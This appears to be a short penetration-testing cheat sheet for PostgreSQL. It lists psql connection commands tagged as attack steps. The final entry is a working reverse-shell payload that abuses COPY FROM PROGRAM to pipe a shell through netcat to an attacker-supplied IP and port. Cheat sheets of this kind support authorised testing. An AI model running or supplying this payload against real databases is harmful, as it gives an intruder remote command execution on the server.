# Postgres

% postgres, 5432, 5433
#plateform/linux  #target/remote  #protocol/postgres #port/5432 #port/5433

## postgres - connect
#cat/ATTACK/CONNECT 
```
psql -h <host> -U <USER>
```

## postgres - connect database
#cat/ATTACK/CONNECT 
```
psql -h <IP> -U <USER> -d <database>
```

## postgres - connect full options
#cat/ATTACK/CONNECT 
```
psql -h <IP> -p <PORT> -U <USER> -W <PASSWORD> <database>
```

## postgres - revershell
```
CREATE TABLE shell(output text);COPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f';SELECT * FROM shell;
```